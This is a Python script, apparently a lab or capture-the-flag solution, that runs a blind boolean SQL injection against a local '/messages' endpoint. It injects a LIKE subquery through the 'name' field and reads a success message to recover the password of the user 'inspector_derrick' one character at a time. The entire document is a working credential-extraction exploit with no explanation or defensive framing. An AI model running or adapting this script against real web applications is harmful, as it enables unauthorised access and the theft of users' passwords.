import requests
import re
from bs4 import BeautifulSoup
import sys

if (len(sys.argv) > 1):
    addr = "0.0.0.0"
else:
    addr = "127.0.0.1"

String1 = "john' or (select length(name) from users where name = 'inspector_derrick' and password LIKE '"
String2 = "%') > 0 --'"
Password = ""
found = False
Pass_length = 0
CharacterArray = []
for i in range(48, 65):
    CharacterArray.append(chr(i))
for i in range(97, 126):
    CharacterArray.append(chr(i))

while(True):
    found = False

    if (Pass_length != 0):
        String1 = String1 + "_"

    for i in CharacterArray:
        character = i
        Query = String1 + character + String2
        data = {'name': Query}
        r = requests.post('http://' + addr + '/messages', data)
        html = r.text
        soup = BeautifulSoup(html, "html.parser")
        result = soup.findAll('div', text = re.compile('The name exists !'), attrs = {'class' : 'alert alert-success'})
        if (len(result) == 1):
            found = True
            Password = Password + character
            Pass_length = Pass_length + 1

    if (not found):
        sys.stdout.write(Password)
        break

